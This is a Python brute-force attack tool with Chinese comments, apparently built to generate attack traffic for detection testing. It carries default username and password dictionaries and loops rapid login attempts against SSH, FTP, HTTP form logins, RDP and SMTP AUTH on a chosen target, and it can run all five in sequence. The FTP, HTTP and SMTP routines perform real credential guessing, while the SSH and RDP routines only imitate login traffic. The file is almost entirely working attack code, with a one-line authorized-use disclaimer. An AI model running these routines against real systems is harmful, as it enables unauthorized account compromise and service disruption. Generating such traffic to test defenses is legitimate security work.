#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
暴力破解攻击脚本（5种攻击方式）
================================

包含：SSH暴力破解、FTP暴力破解、HTTP登录爆破、RDP暴力破解、SMTP暴力破解

用法：
  python brute_force.py --target <IP> --attack <ssh|ftp|http|rdp|smtp|all>

⚠️ 仅用于授权测试环境，禁止用于未授权目标！

御链天鉴开发团队
"""

import argparse
import random
import socket
import time
import threading
import sys
from config import TARGET_IP, ATTACK_DURATION
from scapy.all import IP, TCP, Raw, send, sr1, RandShort, conf

conf.verb = 0

USERNAMES = ["admin", "root", "test", "user", "administrator", "guest",
             "oracle", "postgres", "mysql", "ftp", "www", "backup"]

PASSWORDS = ["123456", "password", "admin", "root", "12345678", "qwerty",
             "letmein", "welcome", "monkey", "master", "dragon", "login",
             "abc123", "111111", "passw0rd", "1234567890", "p@ssword",
             "admin123", "test123", "guest123", "changeme", "default"]


# ========== 1. SSH 暴力破解 ==========
def ssh_bruteforce(target, port=22, duration=30, attempts_per_sec=5):
    """
    SSH暴力破解：高频尝试SSH登录，模拟密码字典攻击
    特征：大量TCP连接到22端口，SSH协议握手后快速断开
    """
    print(f"[SSH暴力破解] 目标={target}:{port}, 持续={duration}s")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            # SSH banner交换
            banner = s.recv(1024)
            s.send(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n")
            # 模拟认证尝试（发送随机数据模拟密码）
            user = random.choice(USERNAMES)
            pwd = random.choice(PASSWORDS)
            auth_data = f"{user}:{pwd}".encode()
            s.send(auth_data)
            s.close()
            count += 1
        except Exception:
            pass
        time.sleep(1.0 / attempts_per_sec)
    print(f"[SSH暴力破解] 完成，共尝试 {count} 次登录")


# ========== 2. FTP 暴力破解 ==========
def ftp_bruteforce(target, port=21, duration=30, attempts_per_sec=5):
    """
    FTP暴力破解：高频尝试FTP登录
    特征：大量TCP连接到21端口，USER/PASS命令快速重复
    """
    print(f"[FTP暴力破解] 目标={target}:{port}, 持续={duration}s")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            s.recv(1024)  # 220 banner
            user = random.choice(USERNAMES)
            pwd = random.choice(PASSWORDS)
            s.send(f"USER {user}\r\n".encode())
            s.recv(1024)
            s.send(f"PASS {pwd}\r\n".encode())
            s.recv(1024)
            s.send(b"QUIT\r\n")
            s.close()
            count += 1
        except Exception:
            pass
        time.sleep(1.0 / attempts_per_sec)
    print(f"[FTP暴力破解] 完成，共尝试 {count} 次登录")


# ========== 3. HTTP 登录爆破 ==========
def http_bruteforce(target, port=80, duration=30, attempts_per_sec=10, path="/login"):
    """
    HTTP登录爆破：高频发送HTTP POST登录请求
    特征：大量POST到登录页面，不同用户名/密码组合
    """
    print(f"[HTTP登录爆破] 目标={target}:{port}{path}, 持续={duration}s")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            user = random.choice(USERNAMES)
            pwd = random.choice(PASSWORDS)
            body = f"username={user}&password={pwd}"
            request = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{body}"
            )
            s.send(request.encode())
            s.recv(1024)
            s.close()
            count += 1
        except Exception:
            pass
        time.sleep(1.0 / attempts_per_sec)
    print(f"[HTTP登录爆破] 完成，共尝试 {count} 次登录")


# ========== 4. RDP 暴力破解 ==========
def rdp_bruteforce(target, port=3389, duration=30, attempts_per_sec=3):
    """
    RDP暴力破解：高频尝试RDP连接
    特征：大量TCP连接到3389端口，RDP协议握手
    """
    print(f"[RDP暴力破解] 目标={target}:{port}, 持续={duration}s")
    # RDP Connection Request (X.224)
    rdp_conn_request = bytes([
        0x03, 0x00,  # TPKT header
        0x00, 0x2b,  # Length
        0x26,        # X.224 length
        0xe0,        # CR (Connection Request)
        0x00, 0x00,  # DST-REF
        0x00, 0x00,  # SRC-REF
        0x00,        # Class 0
        0x43, 0x6f, 0x6f, 0x6b, 0x69, 0x65, 0x3a, 0x20,  # "Cookie: "
        0x6d, 0x73, 0x74, 0x73, 0x68, 0x61, 0x73, 0x68, 0x3d,  # "mstshash="
    ])
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            user = random.choice(USERNAMES)
            payload = rdp_conn_request + user.encode() + b"\r\n"
            # 修正长度字段
            length = len(payload)
            payload = payload[:2] + length.to_bytes(2, 'big') + payload[4:]
            s.send(payload)
            s.recv(1024)
            s.close()
            count += 1
        except Exception:
            pass
        time.sleep(1.0 / attempts_per_sec)
    print(f"[RDP暴力破解] 完成，共尝试 {count} 次连接")


# ========== 5. SMTP 暴力破解 ==========
def smtp_bruteforce(target, port=25, duration=30, attempts_per_sec=3):
    """
    SMTP暴力破解：尝试SMTP AUTH登录
    特征：大量TCP连接到25端口，EHLO/AUTH命令
    """
    print(f"[SMTP暴力破解] 目标={target}:{port}, 持续={duration}s")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((target, port))
            s.recv(1024)  # 220 banner
            s.send(f"EHLO attacker.local\r\n".encode())
            s.recv(1024)
            user = random.choice(USERNAMES)
            pwd = random.choice(PASSWORDS)
            import base64
            s.send(b"AUTH LOGIN\r\n")
            s.recv(1024)
            s.send(base64.b64encode(user.encode()) + b"\r\n")
            s.recv(1024)
            s.send(base64.b64encode(pwd.encode()) + b"\r\n")
            s.recv(1024)
            s.send(b"QUIT\r\n")
            s.close()
            count += 1
        except Exception:
            pass
        time.sleep(1.0 / attempts_per_sec)
    print(f"[SMTP暴力破解] 完成，共尝试 {count} 次登录")


# ========== 主入口 ==========
ATTACK_MAP = {
    "ssh": ("SSH暴力破解", ssh_bruteforce),
    "ftp": ("FTP暴力破解", ftp_bruteforce),
    "http": ("HTTP登录爆破", http_bruteforce),
    "rdp": ("RDP暴力破解", rdp_bruteforce),
    "smtp": ("SMTP暴力破解", smtp_bruteforce),
}

def main():
    parser = argparse.ArgumentParser(description="暴力破解攻击工具 - 御链天鉴")
    parser.add_argument("--target", "-t", default=TARGET_IP, help=f"目标IP地址 (默认: {TARGET_IP})")
    parser.add_argument("--attack", "-a", default="ssh",
                        choices=list(ATTACK_MAP.keys()) + ["all"], help="攻击类型")
    parser.add_argument("--port", "-p", type=int, default=None, help="目标端口(默认自动)")
    parser.add_argument("--duration", "-d", type=int, default=30, help="持续时间(秒)")
    args = parser.parse_args()

    default_ports = {"ssh": 22, "ftp": 21, "http": 80, "rdp": 3389, "smtp": 25}

    print(f"{'='*60}")
    print(f"暴力破解攻击工具 - 御链天鉴")
    print(f"目标: {args.target}")
    print(f"持续: {args.duration}s")
    print(f"{'='*60}")

    if args.attack == "all":
        for key, (name, func) in ATTACK_MAP.items():
            port = args.port or default_ports.get(key, 80)
            print(f"\n--- {name} (端口 {port}) ---")
            func(args.target, port=port, duration=min(args.duration, 20))
            time.sleep(2)
    else:
        port = args.port or default_ports.get(args.attack, 80)
        name, func = ATTACK_MAP[args.attack]
        print(f"\n--- {name} (端口 {port}) ---")
        func(args.target, port=port, duration=args.duration)

    print(f"\n{'='*60}")
    print("攻击完成")


if __name__ == "__main__":
    main()
